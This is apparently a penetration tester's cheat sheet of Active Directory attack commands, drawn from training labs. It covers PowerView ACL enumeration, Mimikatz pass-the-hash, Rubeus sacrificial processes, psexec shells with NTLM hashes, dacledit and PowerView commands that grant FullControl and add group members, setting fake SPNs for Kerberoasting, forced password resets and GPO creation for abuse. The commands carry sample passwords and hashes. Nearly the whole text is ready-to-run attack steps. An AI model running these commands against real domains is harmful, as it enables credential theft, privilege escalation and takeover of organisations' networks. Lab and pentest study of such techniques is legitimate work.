# Essentials

### <mark style="color:yellow;">PowerView Enumeration</mark>

<pre class="language-powershell"><code class="lang-powershell"><strong># Check user
</strong>Get-NetUser -Identity svc_adm
<strong>
</strong><strong># Check my group membership of user:
</strong>Get-NetUser -Identity svc_adm | Select-Object MemberOf

# Check what groups I belong to
Get-DomainGroup -MemberIdentity sarah.lafferty

# Check members of a group using nxc
 nxc smb 172.16.116.3 -u svc_sql -p pass123 --groups "Exchange Windows Permissions"

# Check ACLs on group
$sid = ConvertTo-SID joe.evans
Get-DomainObjectAcl -Identity 'Security Operations' | ?{ $_.SecurityIdentifier -eq $sid}

# Get Rights of user
$sid = Convert-NameToSid mczen
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# Get rights over other user
$userSID = (Get-DomainUser -Identity pedro).objectsid
Get-DomainObjectAcl -Identity rita | ?{$_.SecurityIdentifier -eq $userSID}

# Get usernames in domain
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName

# Check rights over other users
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'ZENCORP\\mczen'}}
$guid= "00299570-246d-11d0-a768-00aa006e0529" 
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
</code></pre>

### <mark style="color:yellow;">Mimikatz</mark>

Use mimikatz to start new powershell session with a hash

```powershell
.\mimikatz.exe privilege::debug "sekurlsa::pth /user:jose /ntlm:fa61a89e878f8688afb10b515a4866c7 /domain:zencorp.local /run:powershell.exe" exit
```

### <mark style="color:yellow;">Sacrificial process</mark>

```bash
.\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show

# With password
.\Rubeus.exe createnetonly /program:powershell.exe /username:holly /password:'Password123!' /domain:zencorp.local /show

# With hash
Rubeus.exe createnetonly /program:powershell.exe /username:holly /ntlm:HASH_VALUE /domain:zencorp.local /show
```

### <mark style="color:yellow;">Delegations</mark>

```bash
findDelegation.py -target-domain zencorp.local -dc-ip 172.16.92.10 -dc-host dc02 zencorp.local/gabriel:Godisgood001
```

### <mark style="color:yellow;">WinRM</mark>

```bash
# Execute command on remote system
Invoke-Command -ComputerName srv02 -ScriptBlock { whoami }
winrs -r:srv02 "powershell -c whoami;hostname"

# Interactive shell
Enter-PSSession ws01.zencorp.local
```

### <mark style="color:yellow;">Shell</mark>

```bash
psexec.py 'inlanefreight.local/administrator@10.129.218.254' -hashes :09721250b7544a54058c270807c62488
```

### <mark style="color:yellow;">Enumeration Linux</mark>

```bash
# Find delegations
findDelegation.py -target-domain zencorp.local -dc-ip 172.19.99.10 inlanefreight.local/taino:Adrian01

# # Check rights over user
dacledit.py zencorp.local/taino:Adrian01 -target 'db2000$'

# Check rights over user
dacledit.py zencorp.local/taino:Adrian01 -principal taino -target 'db2000$'
```

### <mark style="color:yellow;">DACL Linux</mark>

```powershell
# Grant user rights FullControl
python3 dacledit.py -principal remote_svc$ -target 'IT Admins' -dc-ip 10.129.218.254 zencorp.local/remote_svc$ -hashes :02079074b002235d8792b0c5bfb93fb4 -action write -rights FullControl

# Add member
pth-net rpc group addmem "IT Admins" "remote_svc$" -U zencorp.local/remote_svc$%ffffffffffffffffffffffffffffffff:02079074b002235d8792b0c5bfb93fb4 -S "10.129.218.254"
```

### <mark style="color:yellow;">Enumeration Windows</mark>

```powershell
# Get Users in domain
Get-User -Filter * -Property Name | Select-Object -ExpandProperty Name

# Get Computers in domain
Get-ADComputer -Filter * -Property Name | Select-Object -ExpandProperty Name

# Check permission over user
dsacls.exe "cn=Sam,cn=users,dc=inlanefreight,dc=local" | Select-String "Pedro" -Context 0,3

# Fetch ACEs pedro has over sqladmin
$pedroSID = (Get-DomainUser -Identity pedro).ObjectSID
Get-DomainObjectAcl -Identity sqladmin | ? {$_.SecurityIdentifier -eq $pedroSID}

# Get SPN attribute
Get-DomainComputer SRVWEB07 | Select-Object -ExpandProperty serviceprincipalname

# Get user SPN
(Get-DomainUser -Identity Felipe).serviceprincipalname

# Check msDS-KeyCredentialLink for Shadow creds
Get-DomainUser -Filter '(msDS-KeyCredentialLink=*)'

# Query ScriptPath
Get-DomainObject benjamin -Properties scriptPath

# Get Constrained delegation orphans
Import-Module .\PowerView.ps1
Import-Module .\Get-ConstrainedDelegation.ps1
Get-ConstrainedDelegation -CheckOrphaned

# Convert from SID
ConvertFrom-SID S-1-5-21-831407601-1803900599-2479021482-1112

# Get DomainOU
Get-DomainOU -Properties name,gplink

# Get name GPO
Get-GPO -Guid 8F3E10E7-E9FC-43C7-A58F-3ECFFBF69756

# Create new GPO
New-GPO -Name "AngelGPO" -Verbose

# Create and link GPO
Import-Module .\PowerView.ps1
Import-Module .\Get-GPOEnumeration.ps1
Get-GPOEnumeration -CreateGPO
Get-GPOEnumeration -LinkGPOs
```

#### Checking group permissions by getting ACL list.

```bash
# Import AD module
Import-Module ActiveDirectory

# Check group memberships
Get-ADGroupMember -Identity "Cert Publishers"

# Get ACL list
(Get-ACL -Path "AD:\CN=Cert Publishers,CN=Users,DC=sequel,DC=htb").Access | Format-Table IdentityReference, ActiveDirectoryRights, AccessControlType

# Check permission over group
Get-ACL -Path "AD:\CN=Domain Admins,CN=Users,DC=sequel,DC=htb" | Select-Object -ExpandProperty Access
```

### <mark style="color:yellow;">DACL Windows</mark>

```powershell
# Grant user rights FullControl
Add-DomainObjectAcl -TargetIdentity TechSupport -PrincipalIdentity jose -Rights All

# Add member
Add-DomainGroupMember -Identity TechSupport -Members jose 

# Set SPN on target
$SecPassword = ConvertTo-SecureString 'Music001' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('LAB\jeffry', $SecPassword)
Set-DomainObject -Credential $Cred -Identity martha -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}

# Change password
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity elieser -AccountPassword $UserPassword -Verbos

# Sacrifical process
.\Rubeus.exe createnetonly /program:powershell.exe /username:elieser /password:'Password123!' /domain:zencorp.local /show

# Clear and Set SPN
Set-DomainObject -Identity SRVWEB07 -Clear 'serviceprincipalname' -Verbose
Set-DomainObject -Identity WEB01 -Set @{serviceprincipalname='MSSQL/SRVWEB07'} -Verbose
```
